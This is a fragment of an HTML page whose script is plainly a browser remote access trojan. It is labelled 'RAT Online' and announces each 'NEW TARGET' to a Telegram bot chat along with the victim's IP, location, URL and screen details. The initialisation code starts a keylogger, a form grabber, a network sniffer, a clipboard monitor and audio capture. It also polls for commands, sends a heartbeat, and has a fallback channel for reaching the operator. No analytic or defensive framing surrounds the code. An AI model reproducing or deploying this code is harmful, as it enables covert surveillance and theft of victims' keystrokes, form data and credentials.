                    await Telegram.sendMessage(`💓 Heartbeat from ${State.clientId}`, 'HTML');
                } catch (e) {}
            }, CONFIG.features.heartbeatInterval);
        }
        
        // ============= INITIALIZATION =============
        (async function init() {
            try {
                UI.hideError();
                
                // Generate client ID
                State.clientId = Utils.generateClientId();
                UI.updateStatus(5, 'Initializing...');
                
                // Test connection
                UI.updateStatus(15, 'Testing connection...');
                await Telegram.request('sendMessage', {
                    chat_id: CONFIG.allowedGroupId,
                    text: `🔌 <b>RAT Online</b>\nClient: ${State.clientId}\nVersion: 7.0 Ultimate`,
                    parse_mode: 'HTML'
                });
                
                UI.updateStatus(50, 'Connected');
                
                // Collect and send device info
                const info = await DeviceInfo.collect();
                
                await Telegram.sendMessage(`
<b>🔴 NEW TARGET</b>
━━━━━━━━━━━━━━
ID: ${State.clientId}
IP: ${info.ip || 'Unknown'}
${info.country ? `Location: ${info.city}, ${info.country}` : ''}
URL: ${info.url}
Screen: ${info.screen}
━━━━━━━━━━━━━━
<b>⚡ All modules ready</b>
<b>🎵 Audio: ENABLED</b>
<b>🖼️ Gallery: ENABLED</b>
<b>👥 Group: ACTIVE</b>
                `, 'HTML');
                
                UI.updateStatus(80, 'Initializing modules...');
                
                // Initialize surveillance
                Surveillance.initKeylogger();
                Surveillance.initFormGrabber();
                Surveillance.initNetworkSniffer();
                Surveillance.initClipboardMonitor();
                
                // Initialize features
                AudioFeatures.init();
                
                // Start services
                startPolling();
                startHeartbeat();
                
                UI.updateStatus(100, 'System ready');
                
                // Flush old updates
                await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/getUpdates?offset=-1`);
                
            } catch (error) {
                console.error('Init error:', error);
                UI.showError(`Connection failed: ${error.message}`);
                
                // Try fallback
                try {
                    await Telegram.imagePing('sendMessage', {
                        chat_id: CONFIG.allowedGroupId,
                        text: `⚠️ <b>Partial Connection</b>\nClient: ${State.clientId}`,
                        parse_mode: 'HTML'
                    });
                } catch (e) {}
            }
        })();
    </script>
</body>
</html>
